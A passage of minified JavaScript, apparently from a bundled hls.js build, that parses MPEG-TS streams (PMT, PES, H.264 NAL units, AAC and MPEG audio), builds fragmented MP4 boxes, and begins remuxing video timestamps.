                                    this.sampleAes.decryptAvcSamples(t.samples, 0, 0, function() { o.remuxer.remux(e, t, r, i, n, a, s) }) } else this.remuxer.remux(e, t, r, i, n, a, s) }, t.destroy = function() { this._initPTS = this._initDTS = void 0, this._duration = 0 }, t._parsePAT = function(e, t) { return (31 & e[t + 10]) << 8 | e[t + 11] }, t._trackUnknownPmt = function(e, t, r) { var i = this.pmtUnknownTypes[e] || 0; return 0 === i && (this.pmtUnknownTypes[e] = 0, t.call(S.logger, r)), this.pmtUnknownTypes[e]++, i }, t._parsePMT = function(e, t, r, i) { var n, a, s, o, l = { audio: -1, avc: -1, id3: -1, isAAC: !0 }; for (n = (15 & e[t + 1]) << 8 | e[t + 2], a = t + 3 + n - 4, s = (15 & e[t + 10]) << 8 | e[t + 11], t += 12 + s; t < a;) { switch (o = (31 & e[t + 1]) << 8 | e[t + 2], e[t]) {
                                        case 207:
                                            if (!i) { this._trackUnknownPmt(e[t], S.logger.warn, "ADTS AAC with AES-128-CBC frame encryption found in unencrypted stream"); break }
                                        case 15:
                                            -1 === l.audio && (l.audio = o); break;
                                        case 21:
                                            -1 === l.id3 && (l.id3 = o); break;
                                        case 219:
                                            if (!i) { this._trackUnknownPmt(e[t], S.logger.warn, "H.264 with AES-128-CBC slice encryption found in unencrypted stream"); break }
                                        case 27:
                                            -1 === l.avc && (l.avc = o); break;
                                        case 3:
                                        case 4:
                                            r ? -1 === l.audio && (l.audio = o, l.isAAC = !1) : this._trackUnknownPmt(e[t], S.logger.warn, "MPEG audio found, not supported in this browser"); break;
                                        case 36:
                                            this._trackUnknownPmt(e[t], S.logger.warn, "Unsupported HEVC stream type found"); break;
                                        default:
                                            this._trackUnknownPmt(e[t], S.logger.log, "Unknown stream type:" + e[t]) }
                                    t += 5 + ((15 & e[t + 3]) << 8 | e[t + 4]) } return l }, t._parsePES = function(e) { var t, r, i, n, a, s, o, l, u = 0,
                                    c = e.data; if (!e || 0 === e.size) return null; for (; c[0].length < 19 && c.length > 1;) { var d = new Uint8Array(c[0].length + c[1].length);
                                    d.set(c[0]), d.set(c[1], c[0].length), c[0] = d, c.splice(1, 1) } if (t = c[0], 1 === (t[0] << 16) + (t[1] << 8) + t[2]) { if ((i = (t[4] << 8) + t[5]) && i > e.size - 6) return null; if (r = t[7], 192 & r && (s = 536870912 * (14 & t[9]) + 4194304 * (255 & t[10]) + 16384 * (254 & t[11]) + 128 * (255 & t[12]) + (254 & t[13]) / 2, 64 & r ? (o = 536870912 * (14 & t[14]) + 4194304 * (255 & t[15]) + 16384 * (254 & t[16]) + 128 * (255 & t[17]) + (254 & t[18]) / 2, s - o > 54e5 && (S.logger.warn(Math.round((s - o) / 9e4) + "s delta between PTS and DTS, align them"), s = o)) : o = s), n = t[8], l = n + 9, e.size <= l) return null;
                                    e.size -= l, a = new Uint8Array(e.size); for (var f = 0, h = c.length; f < h; f++) { t = c[f]; var g = t.byteLength; if (l) { if (l > g) { l -= g; continue }
                                            t = t.subarray(l), g -= l, l = 0 }
                                        a.set(t, u), u += g } return i && (i -= n + 3), { data: a, pts: s, dts: o, len: i } } return null }, t.pushAccesUnit = function(e, t) { if (e.units.length && e.frame) { var r = t.samples,
                                        i = r.length; if (isNaN(e.pts)) { if (!i) return void t.dropped++; var n = r[i - 1];
                                        e.pts = n.pts, e.dts = n.dts }!this.config.forceKeyFrameOnDiscontinuity || !0 === e.key || t.sps && (i || this.contiguous) ? (e.id = i, r.push(e)) : t.dropped++ }
                                e.debug.length && S.logger.log(e.pts + "/" + e.dts + ":" + e.debug) }, t._parseAVCPES = function(e, t) { var r, i, n, a = this,
                                    s = this._avcTrack,
                                    o = this._parseAVCNALu(e.data),
                                    l = this.avcSample,
                                    u = !1,
                                    c = this.pushAccesUnit.bind(this),
                                    d = function(e, t, r, i) { return { key: e, pts: t, dts: r, units: [], debug: i } };
                                e.data = null, l && o.length && !s.audFound && (c(l, s), l = this.avcSample = d(!1, e.pts, e.dts, "")), o.forEach(function(t) { switch (t.type) {
                                        case 1:
                                            i = !0, l || (l = a.avcSample = d(!0, e.pts, e.dts, "")), l.frame = !0; var o = t.data; if (u && o.length > 4) { var f = new C(o).readSliceType();
                                                2 !== f && 4 !== f && 7 !== f && 9 !== f || (l.key = !0) } break;
                                        case 5:
                                            i = !0, l || (l = a.avcSample = d(!0, e.pts, e.dts, "")), l.key = !0, l.frame = !0; break;
                                        case 6:
                                            i = !0, r = new C(a.discardEPB(t.data)), r.readUByte(); for (var h = 0, g = 0, p = !1, v = 0; !p && r.bytesAvailable > 1;) { h = 0;
                                                do { v = r.readUByte(), h += v } while (255 === v);
                                                g = 0;
                                                do { v = r.readUByte(), g += v } while (255 === v); if (4 === h && 0 !== r.bytesAvailable) { p = !0; if (181 === r.readUByte()) { if (49 === r.readUShort()) { if (1195456820 === r.readUInt()) { if (3 === r.readUByte()) { var m = r.readUByte(),
                                                                        y = r.readUByte(),
                                                                        b = 31 & m,
                                                                        _ = [m, y]; for (n = 0; n < b; n++) _.push(r.readUByte()), _.push(r.readUByte()), _.push(r.readUByte());
                                                                    a._insertSampleInOrder(a._txtTrack.samples, { type: 3, pts: e.pts, bytes: _ }) } } } } } else if (5 === h && 0 !== r.bytesAvailable) { if (p = !0, g > 16) { var E = []; for (n = 0; n < 16; n++) E.push(r.readUByte().toString(16)), 3 !== n && 5 !== n && 7 !== n && 9 !== n || E.push("-"); var S = g - 16,
                                                            T = new Uint8Array(S); for (n = 0; n < S; n++) T[n] = r.readUByte();
                                                        a._insertSampleInOrder(a._txtTrack.samples, { pts: e.pts, payloadType: h, uuid: E.join(""), userDataBytes: T, userData: Object(w.utf8ArrayToStr)(T.buffer) }) } } else if (g < r.bytesAvailable)
                                                    for (n = 0; n < g; n++) r.readUByte() } break;
                                        case 7:
                                            if (i = !0, u = !0, !s.sps) { r = new C(t.data); var A = r.readSPS();
                                                s.width = A.width, s.height = A.height, s.pixelRatio = A.pixelRatio, s.sps = [t.data], s.duration = a._duration; var R = t.data.subarray(1, 4),
                                                    P = "avc1."; for (n = 0; n < 3; n++) { var k = R[n].toString(16);
                                                    k.length < 2 && (k = "0" + k), P += k }
                                                s.codec = P } break;
                                        case 8:
                                            i = !0, s.pps || (s.pps = [t.data]); break;
                                        case 9:
                                            i = !1, s.audFound = !0, l && c(l, s), l = a.avcSample = d(!1, e.pts, e.dts, ""); break;
                                        case 12:
                                            i = !1; break;
                                        default:
                                            i = !1, l && (l.debug += "unknown NAL " + t.type + " ") } if (l && i) { l.units.push(t) } }), t && l && (c(l, s), this.avcSample = null) }, t._insertSampleInOrder = function(e, t) { var r = e.length; if (r > 0) { if (t.pts >= e[r - 1].pts) e.push(t);
                                    else
                                        for (var i = r - 1; i >= 0; i--)
                                            if (t.pts < e[i].pts) { e.splice(i, 0, t); break } } else e.push(t) }, t._getLastNalUnit = function() { var e, t = this.avcSample; if (!t || 0 === t.units.length) { var r = this._avcTrack,
                                        i = r.samples;
                                    t = i[i.length - 1] } if (t) { var n = t.units;
                                    e = n[n.length - 1] } return e }, t._parseAVCNALu = function(e) { var t, r, i, n, a, s = 0,
                                    o = e.byteLength,
                                    l = this._avcTrack,
                                    u = l.naluState || 0,
                                    c = u,
                                    d = [],
                                    f = -1; for (-1 === u && (f = 0, a = 31 & e[0], u = 0, s = 1); s < o;)
                                    if (t = e[s++], u)
                                        if (1 !== u)
                                            if (t)
                                                if (1 === t) { if (f >= 0) i = { data: e.subarray(f, s - u - 1), type: a }, d.push(i);
                                                    else { var h = this._getLastNalUnit(); if (h && (c && s <= 4 - c && h.state && (h.data = h.data.subarray(0, h.data.byteLength - c)), (r = s - u - 1) > 0)) { var g = new Uint8Array(h.data.byteLength + r);
                                                            g.set(h.data, 0), g.set(e.subarray(0, r), h.data.byteLength), h.data = g } }
                                                    s < o ? (n = 31 & e[s], f = s, a = n, u = 0) : u = -1 } else u = 0;
                                else u = 3;
                                else u = t ? 0 : 2;
                                else u = t ? 0 : 1; if (f >= 0 && u >= 0 && (i = { data: e.subarray(f, o), type: a, state: u }, d.push(i)), 0 === d.length) { var p = this._getLastNalUnit(); if (p) { var v = new Uint8Array(p.data.byteLength + e.byteLength);
                                        v.set(p.data, 0), v.set(e, p.data.byteLength), p.data = v } } return l.naluState = u, d }, t.discardEPB = function(e) { for (var t, r, i = e.byteLength, n = [], a = 1; a < i - 2;) 0 === e[a] && 0 === e[a + 1] && 3 === e[a + 2] ? (n.push(a + 2), a += 2) : a++; if (0 === n.length) return e;
                                t = i - n.length, r = new Uint8Array(t); var s = 0; for (a = 0; a < t; s++, a++) s === n[0] && (s++, n.shift()), r[a] = e[s]; return r }, t._parseAACPES = function(e) { var t, r, i, n, a, s = this._audioTrack,
                                    l = e.data,
                                    d = e.pts,
                                    h = this.aacOverFlow,
                                    g = this.aacLastPTS; if (h) { var p = new Uint8Array(h.byteLength + l.byteLength);
                                    p.set(h, 0), p.set(l, h.byteLength), l = p } for (i = 0, a = l.length; i < a - 1 && !o(l, i); i++); if (i) { var v, m; if (i < a - 1 ? (v = "AAC PES did not start with ADTS header,offset:" + i, m = !1) : (v = "no ADTS header found in AAC PES", m = !0), S.logger.warn("parsing error:" + v), this.observer.trigger(y.default.ERROR, { type: b.ErrorTypes.MEDIA_ERROR, details: b.ErrorDetails.FRAG_PARSING_ERROR, fatal: m, reason: v }), m) return } if (u(s, this.observer, l, i, this.audioCodec), r = 0, t = c(s.samplerate), h && g) { var _ = g + t;
                                    Math.abs(_ - d) > 1 && (S.logger.log("AAC: align PTS for overlapping frames by " + Math.round((_ - d) / 90)), d = _) } for (; i < a;) { if (o(l, i)) { if (i + 5 < a) { var E = f(s, l, i, d, r); if (E) { i += E.length, n = E.sample.pts, r++; continue } } break }
                                    i++ }
                                h = i < a ? l.subarray(i, a) : null, this.aacOverFlow = h, this.aacLastPTS = n }, t._parseMPEGPES = function(e) { for (var t = e.data, r = t.length, i = 0, n = 0, a = e.pts; n < r;)
                                    if (D.isHeader(t, n)) { var s = D.appendFrame(this._audioTrack, t, n, a, i); if (!s) break;
                                        n += s.length, i++ } else n++ }, t._parseID3PES = function(e) { this._id3Track.samples.push(e) }, e }(),
                        N = x,
                        F = function() {
                            function e(e, t, r) { this.observer = e, this.config = r, this.remuxer = t } var t = e.prototype; return t.resetInitSegment = function(e, t, r, i) { this._audioTrack = { container: "audio/mpeg", type: "audio", id: -1, sequenceNumber: 0, isAAC: !1, samples: [], len: 0, manifestCodec: t, duration: i, inputTimeScale: 9e4 } }, t.resetTimeStamp = function() {}, e.probe = function(e) { var t, r, i = w.default.getID3Data(e, 0); if (i && void 0 !== w.default.getTimeStamp(i))
                                    for (t = i.length, r = Math.min(e.length - 1, t + 100); t < r; t++)
                                        if (D.probe(e, t)) return S.logger.log("MPEG Audio sync word found !"), !0;
                                return !1 }, t.append = function(e, t, r, i) { for (var n = w.default.getID3Data(e, 0) || [], a = w.default.getTimeStamp(n), s = void 0 !== a ? 90 * a : 9e4 * t, o = n.length, l = e.length, u = 0, c = 0, d = this._audioTrack, f = [{ pts: s, dts: s, data: n }]; o < l;)
                                    if (D.isHeader(e, o)) { var h = D.appendFrame(d, e, o, s, u); if (!h) break;
                                        o += h.length, c = h.sample.pts, u++ } else w.default.isHeader(e, o) ? (n = w.default.getID3Data(e, o), f.push({ pts: c, dts: c, data: n }), o += n.length) : o++;
                                this.remuxer.remux(d, { samples: [] }, { samples: f, inputTimeScale: 9e4 }, { samples: [] }, t, r, i) }, t.destroy = function() {}, e }(),
                        B = F,
                        U = function() {
                            function e() {} return e.getSilentFrame = function(e, t) { switch (e) {
                                    case "mp4a.40.2":
                                        if (1 === t) return new Uint8Array([0, 200, 0, 128, 35, 128]); if (2 === t) return new Uint8Array([33, 0, 73, 144, 2, 25, 0, 35, 128]); if (3 === t) return new Uint8Array([0, 200, 0, 128, 32, 132, 1, 38, 64, 8, 100, 0, 142]); if (4 === t) return new Uint8Array([0, 200, 0, 128, 32, 132, 1, 38, 64, 8, 100, 0, 128, 44, 128, 8, 2, 56]); if (5 === t) return new Uint8Array([0, 200, 0, 128, 32, 132, 1, 38, 64, 8, 100, 0, 130, 48, 4, 153, 0, 33, 144, 2, 56]); if (6 === t) return new Uint8Array([0, 200, 0, 128, 32, 132, 1, 38, 64, 8, 100, 0, 130, 48, 4, 153, 0, 33, 144, 2, 0, 178, 0, 32, 8, 224]); break;
                                    default:
                                        if (1 === t) return new Uint8Array([1, 64, 34, 128, 163, 78, 230, 128, 186, 8, 0, 0, 0, 28, 6, 241, 193, 10, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 94]); if (2 === t) return new Uint8Array([1, 64, 34, 128, 163, 94, 230, 128, 186, 8, 0, 0, 0, 0, 149, 0, 6, 241, 161, 10, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 94]); if (3 === t) return new Uint8Array([1, 64, 34, 128, 163, 94, 230, 128, 186, 8, 0, 0, 0, 0, 149, 0, 6, 241, 161, 10, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 90, 94]) } return null }, e }(),
                        j = U,
                        G = Math.pow(2, 32) - 1,
                        K = function() {
                            function e() {} return e.init = function() { e.types = { avc1: [], avcC: [], btrt: [], dinf: [], dref: [], esds: [], ftyp: [], hdlr: [], mdat: [], mdhd: [], mdia: [], mfhd: [], minf: [], moof: [], moov: [], mp4a: [], ".mp3": [], mvex: [], mvhd: [], pasp: [], sdtp: [], stbl: [], stco: [], stsc: [], stsd: [], stsz: [], stts: [], tfdt: [], tfhd: [], traf: [], trak: [], trun: [], trex: [], tkhd: [], vmhd: [], smhd: [] }; var t; for (t in e.types) e.types.hasOwnProperty(t) && (e.types[t] = [t.charCodeAt(0), t.charCodeAt(1), t.charCodeAt(2), t.charCodeAt(3)]); var r = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 118, 105, 100, 101, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 86, 105, 100, 101, 111, 72, 97, 110, 100, 108, 101, 114, 0]),
                                    i = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 115, 111, 117, 110, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 83, 111, 117, 110, 100, 72, 97, 110, 100, 108, 101, 114, 0]);
                                e.HDLR_TYPES = { video: r, audio: i }; var n = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 12, 117, 114, 108, 32, 0, 0, 0, 1]),
                                    a = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0]);
                                e.STTS = e.STSC = e.STCO = a, e.STSZ = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]), e.VMHD = new Uint8Array([0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0]), e.SMHD = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0]), e.STSD = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 1]); var s = new Uint8Array([105, 115, 111, 109]),
                                    o = new Uint8Array([97, 118, 99, 49]),
                                    l = new Uint8Array([0, 0, 0, 1]);
                                e.FTYP = e.box(e.types.ftyp, s, l, s, o), e.DINF = e.box(e.types.dinf, e.box(e.types.dref, n)) }, e.box = function(e) { for (var t, r = Array.prototype.slice.call(arguments, 1), i = 8, n = r.length, a = n; n--;) i += r[n].byteLength; for (t = new Uint8Array(i), t[0] = i >> 24 & 255, t[1] = i >> 16 & 255, t[2] = i >> 8 & 255, t[3] = 255 & i, t.set(e, 4), n = 0, i = 8; n < a; n++) t.set(r[n], i), i += r[n].byteLength; return t }, e.hdlr = function(t) { return e.box(e.types.hdlr, e.HDLR_TYPES[t]) }, e.mdat = function(t) { return e.box(e.types.mdat, t) }, e.mdhd = function(t, r) { r *= t; var i = Math.floor(r / (G + 1)),
                                    n = Math.floor(r % (G + 1)); return e.box(e.types.mdhd, new Uint8Array([1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 3, t >> 24 & 255, t >> 16 & 255, t >> 8 & 255, 255 & t, i >> 24, i >> 16 & 255, i >> 8 & 255, 255 & i, n >> 24, n >> 16 & 255, n >> 8 & 255, 255 & n, 85, 196, 0, 0])) }, e.mdia = function(t) { return e.box(e.types.mdia, e.mdhd(t.timescale, t.duration), e.hdlr(t.type), e.minf(t)) }, e.mfhd = function(t) { return e.box(e.types.mfhd, new Uint8Array([0, 0, 0, 0, t >> 24, t >> 16 & 255, t >> 8 & 255, 255 & t])) }, e.minf = function(t) { return "audio" === t.type ? e.box(e.types.minf, e.box(e.types.smhd, e.SMHD), e.DINF, e.stbl(t)) : e.box(e.types.minf, e.box(e.types.vmhd, e.VMHD), e.DINF, e.stbl(t)) }, e.moof = function(t, r, i) { return e.box(e.types.moof, e.mfhd(t), e.traf(i, r)) }, e.moov = function(t) { for (var r = t.length, i = []; r--;) i[r] = e.trak(t[r]); return e.box.apply(null, [e.types.moov, e.mvhd(t[0].timescale, t[0].duration)].concat(i).concat(e.mvex(t))) }, e.mvex = function(t) { for (var r = t.length, i = []; r--;) i[r] = e.trex(t[r]); return e.box.apply(null, [e.types.mvex].concat(i)) }, e.mvhd = function(t, r) { r *= t; var i = Math.floor(r / (G + 1)),
                                    n = Math.floor(r % (G + 1)),
                                    a = new Uint8Array([1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 3, t >> 24 & 255, t >> 16 & 255, t >> 8 & 255, 255 & t, i >> 24, i >> 16 & 255, i >> 8 & 255, 255 & i, n >> 24, n >> 16 & 255, n >> 8 & 255, 255 & n, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 255, 255, 255, 255]); return e.box(e.types.mvhd, a) }, e.sdtp = function(t) { var r, i, n = t.samples || [],
                                    a = new Uint8Array(4 + n.length); for (i = 0; i < n.length; i++) r = n[i].flags, a[i + 4] = r.dependsOn << 4 | r.isDependedOn << 2 | r.hasRedundancy; return e.box(e.types.sdtp, a) }, e.stbl = function(t) { return e.box(e.types.stbl, e.stsd(t), e.box(e.types.stts, e.STTS), e.box(e.types.stsc, e.STSC), e.box(e.types.stsz, e.STSZ), e.box(e.types.stco, e.STCO)) }, e.avc1 = function(t) { var r, i, n, a = [],
                                    s = []; for (r = 0; r < t.sps.length; r++) i = t.sps[r], n = i.byteLength, a.push(n >>> 8 & 255), a.push(255 & n), a = a.concat(Array.prototype.slice.call(i)); for (r = 0; r < t.pps.length; r++) i = t.pps[r], n = i.byteLength, s.push(n >>> 8 & 255), s.push(255 & n), s = s.concat(Array.prototype.slice.call(i)); var o = e.box(e.types.avcC, new Uint8Array([1, a[3], a[4], a[5], 255, 224 | t.sps.length].concat(a).concat([t.pps.length]).concat(s))),
                                    l = t.width,
                                    u = t.height,
                                    c = t.pixelRatio[0],
                                    d = t.pixelRatio[1]; return e.box(e.types.avc1, new Uint8Array([0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, l >> 8 & 255, 255 & l, u >> 8 & 255, 255 & u, 0, 72, 0, 0, 0, 72, 0, 0, 0, 0, 0, 0, 0, 1, 18, 100, 97, 105, 108, 121, 109, 111, 116, 105, 111, 110, 47, 104, 108, 115, 46, 106, 115, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 24, 17, 17]), o, e.box(e.types.btrt, new Uint8Array([0, 28, 156, 128, 0, 45, 198, 192, 0, 45, 198, 192])), e.box(e.types.pasp, new Uint8Array([c >> 24, c >> 16 & 255, c >> 8 & 255, 255 & c, d >> 24, d >> 16 & 255, d >> 8 & 255, 255 & d]))) }, e.esds = function(e) { var t = e.config.length; return new Uint8Array([0, 0, 0, 0, 3, 23 + t, 0, 1, 0, 4, 15 + t, 64, 21, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 5].concat([t]).concat(e.config).concat([6, 1, 2])) }, e.mp4a = function(t) { var r = t.samplerate; return e.box(e.types.mp4a, new Uint8Array([0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, t.channelCount, 0, 16, 0, 0, 0, 0, r >> 8 & 255, 255 & r, 0, 0]), e.box(e.types.esds, e.esds(t))) }, e.mp3 = function(t) { var r = t.samplerate; return e.box(e.types[".mp3"], new Uint8Array([0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, t.channelCount, 0, 16, 0, 0, 0, 0, r >> 8 & 255, 255 & r, 0, 0])) }, e.stsd = function(t) { return "audio" === t.type ? t.isAAC || "mp3" !== t.codec ? e.box(e.types.stsd, e.STSD, e.mp4a(t)) : e.box(e.types.stsd, e.STSD, e.mp3(t)) : e.box(e.types.stsd, e.STSD, e.avc1(t)) }, e.tkhd = function(t) { var r = t.id,
                                    i = t.duration * t.timescale,
                                    n = t.width,
                                    a = t.height,
                                    s = Math.floor(i / (G + 1)),
                                    o = Math.floor(i % (G + 1)); return e.box(e.types.tkhd, new Uint8Array([1, 0, 0, 7, 0, 0, 0, 0, 0, 0, 0, 2, 0, 0, 0, 0, 0, 0, 0, 3, r >> 24 & 255, r >> 16 & 255, r >> 8 & 255, 255 & r, 0, 0, 0, 0, s >> 24, s >> 16 & 255, s >> 8 & 255, 255 & s, o >> 24, o >> 16 & 255, o >> 8 & 255, 255 & o, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 64, 0, 0, 0, n >> 8 & 255, 255 & n, 0, 0, a >> 8 & 255, 255 & a, 0, 0])) }, e.traf = function(t, r) { var i = e.sdtp(t),
                                    n = t.id,
                                    a = Math.floor(r / (G + 1)),
                                    s = Math.floor(r % (G + 1)); return e.box(e.types.traf, e.box(e.types.tfhd, new Uint8Array([0, 0, 0, 0, n >> 24, n >> 16 & 255, n >> 8 & 255, 255 & n])), e.box(e.types.tfdt, new Uint8Array([1, 0, 0, 0, a >> 24, a >> 16 & 255, a >> 8 & 255, 255 & a, s >> 24, s >> 16 & 255, s >> 8 & 255, 255 & s])), e.trun(t, i.length + 16 + 20 + 8 + 16 + 8 + 8), i) }, e.trak = function(t) { return t.duration = t.duration || 4294967295, e.box(e.types.trak, e.tkhd(t), e.mdia(t)) }, e.trex = function(t) { var r = t.id; return e.box(e.types.trex, new Uint8Array([0, 0, 0, 0, r >> 24, r >> 16 & 255, r >> 8 & 255, 255 & r, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 1])) }, e.trun = function(t, r) { var i, n, a, s, o, l, u = t.samples || [],
                                    c = u.length,
                                    d = 12 + 16 * c,
                                    f = new Uint8Array(d); for (r += 8 + d, f.set([0, 0, 15, 1, c >>> 24 & 255, c >>> 16 & 255, c >>> 8 & 255, 255 & c, r >>> 24 & 255, r >>> 16 & 255, r >>> 8 & 255, 255 & r], 0), i = 0; i < c; i++) n = u[i], a = n.duration, s = n.size, o = n.flags, l = n.cts, f.set([a >>> 24 & 255, a >>> 16 & 255, a >>> 8 & 255, 255 & a, s >>> 24 & 255, s >>> 16 & 255, s >>> 8 & 255, 255 & s, o.isLeading << 2 | o.dependsOn, o.isDependedOn << 6 | o.hasRedundancy << 4 | o.paddingValue << 1 | o.isNonSync, 61440 & o.degradPrio, 15 & o.degradPrio, l >>> 24 & 255, l >>> 16 & 255, l >>> 8 & 255, 255 & l], 12 + 16 * i); return e.box(e.types.trun, f) }, e.initSegment = function(t) { e.types || e.init(); var r, i = e.moov(t); return r = new Uint8Array(e.FTYP.byteLength + i.byteLength), r.set(e.FTYP), r.set(i, e.FTYP.byteLength), r }, e }(),
                        q = K,
                        H = 9e4,
                        V = p(10),
                        W = p(.2),
                        z = null,
                        Y = function() {
                            function e(e, t, r, i) { if (this.observer = e, this.config = t, this.typeSupported = r, this.ISGenerated = !1, null === z) { var n = navigator.userAgent.match(/Chrome\/(\d+)/i);
                                    z = n ? parseInt(n[1]) : 0 } } var t = e.prototype; return t.destroy = function() {}, t.resetTimeStamp = function(e) { this._initPTS = this._initDTS = e }, t.resetInitSegment = function() { this.ISGenerated = !1 }, t.getVideoStartPts = function(e) { var t = !1,
                                    r = e.reduce(function(e, r) { var i = r.pts - e; return i < -4294967296 ? (t = !0, v(e, r.pts)) : i > 0 ? e : r.pts }, e[0].pts); return t && S.logger.debug("PTS rollover detected"), r }, t.remux = function(e, t, r, i, n, a, s) { if (this.ISGenerated || this.generateIS(e, t, n), this.ISGenerated) { var o = e.samples.length,
                                        l = t.samples.length,
                                        u = n,
                                        c = n; if (o && l) { var d = this.getVideoStartPts(t.samples),
                                            f = v(e.samples[0].pts, d) - d,
                                            h = f / t.inputTimeScale;
                                        u += Math.max(0, h), c += Math.max(0, -h) } if (o) { e.timescale || (S.logger.warn("regenerate InitSegment as audio detected"), this.generateIS(e, t, n)); var g = this.remuxAudio(e, u, a, s); if (l) { var p;
                                            g && (p = g.endPTS - g.startPTS), t.timescale || (S.logger.warn("regenerate InitSegment as video detected"), this.generateIS(e, t, n)), this.remuxVideo(t, c, a, p) } } else if (l) { var m = this.remuxVideo(t, c, a, 0, s);
                                        m && e.codec && this.remuxEmptyAudio(e, u, a, m) } }
                                r.samples.length && this.remuxID3(r, n), i.samples.length && this.remuxText(i, n), this.observer.trigger(y.default.FRAG_PARSED) }, t.generateIS = function(e, t, r) { var i, n, a = this.observer,
                                    s = e.samples,
                                    o = t.samples,
                                    l = this.typeSupported,
                                    u = "audio/mp4",
                                    c = {},
                                    d = { tracks: c },
                                    f = void 0 === this._initPTS; if (f && (i = n = 1 / 0), e.config && s.length && (e.timescale = e.samplerate, S.logger.log("audio sampling rate : " + e.samplerate), e.isAAC || (l.mpeg ? (u = "audio/mpeg", e.codec = "") : l.mp3 && (e.codec = "mp3")), c.audio = { container: u, codec: e.codec, initSegment: !e.isAAC && l.mpeg ? new Uint8Array : q.initSegment([e]), metadata: { channelCount: e.channelCount } }, f && (i = n = s[0].pts - Math.round(e.inputTimeScale * r))), t.sps && t.pps && o.length) { var h = t.inputTimeScale; if (t.timescale = h, c.video = { container: "video/mp4", codec: t.codec, initSegment: q.initSegment([t]), metadata: { width: t.width, height: t.height } }, f) { var g = this.getVideoStartPts(o),
                                            p = Math.round(h * r);
                                        n = Math.min(n, v(o[0].dts, g) - p), i = Math.min(i, g - p), this.observer.trigger(y.default.INIT_PTS_FOUND, { initPTS: i }) } } else f && c.audio && this.observer.trigger(y.default.INIT_PTS_FOUND, { initPTS: i });
                                Object.keys(c).length ? (a.trigger(y.default.FRAG_PARSING_INIT_SEGMENT, d), this.ISGenerated = !0, f && (this._initPTS = i, this._initDTS = n)) : a.trigger(y.default.ERROR, { type: b.ErrorTypes.MEDIA_ERROR, details: b.ErrorDetails.FRAG_PARSING_ERROR, fatal: !1, reason: "no audio/video samples found" }) }, t.remuxVideo = function(e, t, r, i) { var n, a, s, o, l, u = e.timescale,
                                    c = e.samples,
                                    d = [],
                                    f = c.length,
                                    h = this._initPTS,
                                    p = 8,
                                    m = Number.POSITIVE_INFINITY,
                                    _ = Number.NEGATIVE_INFINITY,
                                    E = 0,
                                    T = !1,
                                    w = this.nextAvcDts; if (0 !== f) { if (!r) { w = t * u - (c[0].pts - v(c[0].dts, c[0].pts)) } for (var A = 0; A < f; A++) { var R = c[A];
                                        R.pts = v(R.pts - h, w), R.dts = v(R.dts - h, w), R.dts > R.pts && (E = Math.max(Math.min(E, R.pts - R.dts), -1 * W)), R.dts < c[A > 0 ? A - 1 : A].dts && (T = !0) }
                                    T && c.sort(function(e, t) { var r = e.dts - t.dts,
                                            i = e.pts - t.pts; return r || i || e.id - t.id }), o = c[0].dts, l = c[f - 1].dts; var P = Math.round((l - o) / (f - 1)); if (E < 0) { if (E < -2 * P) { S.logger.warn("PTS < DTS detected in video samples, offsetting DTS from PTS by " + g(-P, !0) + " ms"); for (var k = E, D = 0; D < f; D++) c[D].dts = k = Math.max(k, c[D].pts - P), c[D].pts = Math.max(k, c[D].pts) } else { S.logger.warn("PTS < DTS detected in video samples, shifting DTS by " + g(E, !0) + " ms to overcome this issue"); for (var L = 0; L < f; L++) c[L].dts = c[L].dts + E }
                                        o = c[0].dts, l = c[f - 1].dts } if (r) { var C = o - w,
                                            I = C > P,
                                            O = C < -1; if (I || O) { I ? S.logger.warn("AVC: " + g(C, !0) + " ms (" + C + "dts) hole between fragments detected, filling it") : S.logger.warn("AVC: " + g(-C, !0) + " ms (" + C + "dts) overlapping between fragments detected"), o = w; var M = c[0].pts - C;
